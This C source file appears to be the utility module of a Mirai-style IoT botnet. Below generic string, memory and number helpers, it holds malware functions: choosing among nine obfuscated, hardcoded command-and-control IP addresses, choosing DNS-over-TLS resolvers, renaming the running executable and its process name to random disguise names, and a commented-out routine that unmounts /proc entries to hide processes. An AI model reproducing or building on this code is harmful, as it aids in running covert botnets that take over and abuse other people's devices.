#define _GNU_SOURCE

#include <stdio.h>
#include <stdlib.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <errno.h>
#include <limits.h>
#include <dirent.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <signal.h>
#include <mntent.h>
#include <sys/mount.h>
#include <sys/prctl.h>
#include <time.h>

#include "includes.h"
#include "util.h"
#include "rand.h"
#include "table.h"
#include "base64.h"

int util_strlen(char *str)
{
    int c = 0;

    while (*str++ != 0)
        c++;
    return c;
}

char *_self_path()
{
    char *selfpath = malloc(PATH_MAX);
    if (selfpath == NULL) 
    {
        return NULL;
    }

    ssize_t len = readlink(enc[PROC_SELF_EXE].string, selfpath, PATH_MAX - 1);
    if (len == -1) {
        free(selfpath);
        return NULL;
    }

    selfpath[len] = '\0';
    return selfpath;
}

char *util_strcat(char *destination, const char *source)
{
    char *ptr = destination + util_strlen(destination);

    while (*source != '\0')
        *ptr++ = *source++;

    *ptr = '\0';
    return destination;
}

int util_strncmp1(char *s1, char *s2, size_t n) {
    while (n > 0 && (*s1 || *s2)) {
        if (*s1 != *s2)
            return (*s1 - *s2);
        s1++;
        s2++;
        n--;
    }
    return 0;
}

int utill_strcmp(const char *s1, const char *s2) {
    while (*s1 && (*s1 == *s2)) {
        s1++;
        s2++;
    }

    return *(unsigned char *)s1 - *(unsigned char *)s2;
}

char *util_strchr(const char *s, int c) {
    while (*s != '\0') {
        if (*s == c) {
            return (char *)s;
        }
        s++;
    }
    if (c == '\0') {
        return (char *)s;
    }
    return NULL;
}

char *util_strstr(const char *haystack, const char *needle) {
    if (*needle == '\0') {
        return (char *)haystack;
    }

    while (*haystack != '\0') {
        const char *h = haystack;
        const char *n = needle;

        while (*n != '\0' && *h == *n) {
            h++;
            n++;
        }

        if (*n == '\0') {
            return (char *)haystack;
        }

        haystack++;
    }

    return NULL;
}

BOOL util_mem_exists(char *buf, int buf_len, char *str, int str_len)
{
    int matches = 0;

    if (str_len > buf_len)
        return FALSE;

    while (buf_len--)
    {
        if (*buf++ == str[matches])
        {
            if (++matches == str_len)
                return TRUE;
        }
        else
            matches = 0;
    }

    return FALSE;
}

BOOL util_strncmp(char *str1, char *str2, int len)
{
    int l1 = util_strlen(str1), l2 = util_strlen(str2);

    if (l1 < len || l2 < len)
        return FALSE;

    while (len--)
    {
        if (*str1++ != *str2++)
            return FALSE;
    }

    return TRUE;
}

BOOL util_strcmp(char *str1, char *str2)
{
    int l1 = util_strlen(str1), l2 = util_strlen(str2);

    if (l1 != l2)
        return FALSE;

    while (l1--)
    {
        if (*str1++ != *str2++)
            return FALSE;
    }

    return TRUE;
}

int util_strcpy(char *dst, char *src)
{
    int l = util_strlen(src);

    util_memcpy(dst, src, l + 1);

    return l;
}

void *util_memset(void *dest, int val, size_t len)
{
    unsigned char *ptr = dest;

    while (len-- > 0)
        *ptr++ = val;

    return dest;
}

void _memset(void *buf, char set, int len)
{
    char *zero = buf;
    while (len--)
        *zero++ = set;
}

void util_memcpy(void *dst, void *src, int len)
{
    char *r_dst = (char *)dst;
    char *r_src = (char *)src;
    while (len--)
        *r_dst++ = *r_src++;
}

void util_zero(void *buf, int len)
{
    char *zero = buf;
    while (len--)
        *zero++ = 0;
}

int util_atoi(char *str, int base)
{
	unsigned long acc = 0;
	int c;
	unsigned long cutoff;
	int neg = 0, any, cutlim;

	do {
		c = *str++;
	} while (util_isspace(c));
	if (c == '-') {
		neg = 1;
		c = *str++;
	} else if (c == '+')
		c = *str++;

	cutoff = neg ? -(unsigned long)LONG_MIN : LONG_MAX;
	cutlim = cutoff % (unsigned long)base;
	cutoff /= (unsigned long)base;
	for (acc = 0, any = 0;; c = *str++) {
		if (util_isdigit(c))
			c -= '0';
		else if (util_isalpha(c))
			c -= util_isupper(c) ? 'A' - 10 : 'a' - 10;
		else
			break;

		if (c >= base)
			break;

		if (any < 0 || acc > cutoff || acc == cutoff && c > cutlim)
			any = -1;
		else {
			any = 1;
			acc *= base;
			acc += c;
		}
	}
	if (any < 0) {
		acc = neg ? LONG_MIN : LONG_MAX;
	} else if (neg)
		acc = -acc;
	return (acc);
}

char *util_itoa(int value, int radix, char *string)
{
    if (string == NULL)
        return NULL;

    if (value != 0)
    {
        char scratch[34];
        int neg;
        int offset;
        int c;
        unsigned int accum;

        offset = 32;
        scratch[33] = 0;

        if (radix == 10 && value < 0)
        {
            neg = 1;
            accum = -value;
        }
        else
        {
            neg = 0;
            accum = (unsigned int)value;
        }

        while (accum)
        {
            c = accum % radix;
            if (c < 10)
                c += '0';
            else
                c += 'A' - 10;

            scratch[offset] = c;
            accum /= radix;
            offset--;
        }

        if (neg)
            scratch[offset] = '-';
        else
            offset++;

        util_strcpy(string, &scratch[offset]);
    }
    else
    {
        string[0] = '0';
        string[1] = 0;
    }

    return string;
}

int util_memsearch(char *buf, int buf_len, char *mem, int mem_len)
{
    int i, matched = 0;

    if (mem_len > buf_len)
        return -1;

    for (i = 0; i < buf_len; i++)
    {
        if (buf[i] == mem[matched])
        {
            if (++matched == mem_len)
                return i + 1;
        }
        else
            matched = 0;
    }

    return -1;
}

int util_stristr(char *haystack, int haystack_len, char *str)
{
    char *ptr = haystack;
    int str_len = util_strlen(str);
    int match_count = 0;

    while (haystack_len-- > 0)
    {
        char a = *ptr++;
        char b = str[match_count];
        a = a >= 'A' && a <= 'Z' ? a | 0x60 : a;
        b = b >= 'A' && b <= 'Z' ? b | 0x60 : b;

        if (a == b)
        {
            if (++match_count == str_len)
                return (ptr - haystack);
        }
        else
            match_count = 0;
    }

    return -1;
}

ipv4_t util_local_addr(void)
{
    int fd;
    struct sockaddr_in addr;
    socklen_t addr_len = sizeof (addr);

    errno = 0;
    if ((fd = socket(AF_INET, SOCK_DGRAM, 0)) == -1)
    {
#ifdef DEBUG
        printf("[util] Failed to call socket(), errno = %d\n", errno);
#endif
        return 0;
    }

    addr.sin_family = AF_INET;
    addr.sin_addr.s_addr = INET_ADDR(8,8,8,8);
    addr.sin_port = htons(53);

    connect(fd, (struct sockaddr *)&addr, sizeof (struct sockaddr_in));

    getsockname(fd, (struct sockaddr *)&addr, &addr_len);
    close(fd);
    return addr.sin_addr.s_addr;
}

char *util_fdgets(char *buffer, int buffer_size, int fd)
{
    int got = 0, total = 0;
    do
    {
        got = read(fd, buffer + total, 1);
        total = got == 1 ? total + 1 : total;
    }
    while (got == 1 && total < buffer_size && *(buffer + (total - 1)) != '\n');

    return total == 0 ? NULL : buffer;
}

int util_split(const char *txt, char delim, char ***tokens)
{
    int *tklen, *t, count = 1;
    char **arr, *p = (char *) txt;

    while (*p != '\0')
        if (*p++ == delim)
            count += 1;

    t = tklen = calloc (count, sizeof (int));
    for (p = (char *) txt; *p != '\0'; p++)
        *p == delim ? *t++ : (*t)++;

    *tokens = arr = malloc (count * sizeof (char *));
    t = tklen;
    p = *arr++ = calloc (*(t++) + 1, sizeof (char *));
    while (*txt != '\0')
    {
        if (*txt == delim)
        {
            p = *arr++ = calloc (*(t++) + 1, sizeof (char *));
            txt++;
        }
        else
            *p++ = *txt++;
    }

    free(tklen);
    return count;
}

int util_isupper(char c)
{
    return (c >= 'A' && c <= 'Z');
}

int util_isalpha(char c)
{
    return ((c >= 'A' && c <= 'Z') || (c >= 'a' && c <= 'z'));
}

int util_isspace(char c)
{
    return (c == ' ' || c == '\t' || c == '\n' || c == '\12');
}

int util_isdigit(char c)
{
    return (c >= '0' && c <= '9');
}

static char return_lower(char c) {

    return (c >= 'A' && c <= 'Z') ? c + 32 : c;
}

int util_memcmp(const void *s1, const void *s2, size_t n) {
    const unsigned char *p1 = (const unsigned char *)s1;
    const unsigned char *p2 = (const unsigned char *)s2;

    for (size_t i = 0; i < n; i++) {
        if (p1[i] != p2[i]) {
            return p1[i] - p2[i];
        }
    }
    return 0;
}

int _random_cnc_addr_hardcode()
{
    int random = rand_next() % 9;
    switch (random)
    {
        case 0: return inet_addr(base64_decode_xor(enc[HRD_CDE_IP_1].string, 15));
        case 1: return inet_addr(base64_decode_xor(enc[HRD_CDE_IP_2].string, 14));
        case 2: return inet_addr(base64_decode_xor(enc[HRD_CDE_IP_3].string, 13));
        case 3: return inet_addr(base64_decode_xor(enc[HRD_CDE_IP_4].string, 14));
        case 4: return inet_addr(base64_decode_xor(enc[HRD_CDE_IP_5].string, 14));
        case 5: return inet_addr(base64_decode_xor(enc[HRD_CDE_IP_6].string, 14));
        case 6: return inet_addr(base64_decode_xor(enc[HRD_CDE_IP_7].string, 14));
        case 7: return inet_addr(base64_decode_xor(enc[HRD_CDE_IP_8].string, 13));
        case 8: return inet_addr(base64_decode_xor(enc[HRD_CDE_IP_9].string, 13));
    }
}

const char* _select_dot_resolver() 
{
    int random = rand_next() % 4;
    switch (random) 
    {
        case 0: return enc[DOT_IP_ADDR_1].string;
        case 1: return enc[DOT_IP_ADDR_2].string;
        case 2: return enc[DOT_IP_ADDR_3].string;
        case 3: return enc[DOT_IP_ADDR_4].string;
    }
}

int _atoi(char *str)
{
    int value = 0;

    while (_isdigit(*str))
    {
        value *= 10;
        value += (int)(*str++ - '0');
    }

    return value;
}

int _isdigit(char c)
{
    return (c >= '0' && c <= '9');
}

const char* _random_proc_rename()
{
    const char *process_names[] = {
        enc[IO_RN1].string,
        enc[IO_RN2].string,
        enc[IO_RN3].string,
        enc[IO_RN4].string,
        enc[IO_RN5].string,
        enc[IO_RN6].string
    };
    int num_process_names = sizeof(process_names) / sizeof(process_names[0]);
    srand(time(NULL));
    return process_names[rand() % num_process_names];
}

int _rename_executable(int argc, char **args)
{
    char old_name[1024];
    char new_name[1024];

    ssize_t len = readlink(enc[PROC_SELF_EXE].string, old_name, sizeof(old_name) - 1);
    if (len == -1) 
    {
#ifdef DEBUG
        printf("[rename] Error reading /proc/self/exe\n");
#endif
        return 1;
    }
    old_name[len] = '\0';

    const char *selected_name = _random_proc_rename();
    
    char *last_slash = strrchr(old_name, '/');
    if (last_slash) 
    {
        size_t dir_length = last_slash - old_name + 1;
        strncpy(new_name, old_name, dir_length);
        new_name[dir_length] = '\0';
        strncat(new_name, selected_name, sizeof(new_name) - dir_length - 1);
    } 
    else 
    {
        strncpy(new_name, selected_name, sizeof(new_name) - 1);
        new_name[sizeof(new_name) - 1] = '\0';
    }

    if (rename(old_name, new_name) == 0) 
    {
#ifdef DEBUG
        printf("[rename] Executable renamed successfully to: %s\n", new_name);
#endif
    } 
    else 
    {
#ifdef DEBUG
        printf("[rename] Error renaming the executable\n");
#endif
        return 1;
    }

    strcpy(args[0], selected_name);
    prctl(PR_SET_NAME, selected_name, 0, 0, 0);
    
#ifdef DEBUG
    printf("[rename] Process name set to: %s\n", selected_name);
#endif

    return 0;
}

//static void unmount_proc_entries(void)
//{
//    FILE *mounts_file;
//    struct mntent *mnt;
//    if ((mounts_file = setmntent(enc[PROC_MOUNTS].string, "r")) == NULL)
//        return;
//
//    while ((mnt = getmntent(mounts_file)) != NULL)
//    {
//        if (strncmp(mnt->mnt_dir, enc[PROC_DIR].string, enc[PROC_DIR].len - 1) == 0)
//        {
//            const char *suffix = mnt->mnt_dir + enc[PROC_DIR].len - 1;
//
//            int is_numeric = 1;
//            for (const char *ch = suffix; *ch; ch++)
//            {
//                if (!util_isdigit(*ch))
//                {
//                    is_numeric = 0;
//                    break;
//                }
//            }
//
//            if (is_numeric)
//            {
//                umount(mnt->mnt_dir);
//            }
//        }
//    }
//
//    endmntent(mounts_file);
//}
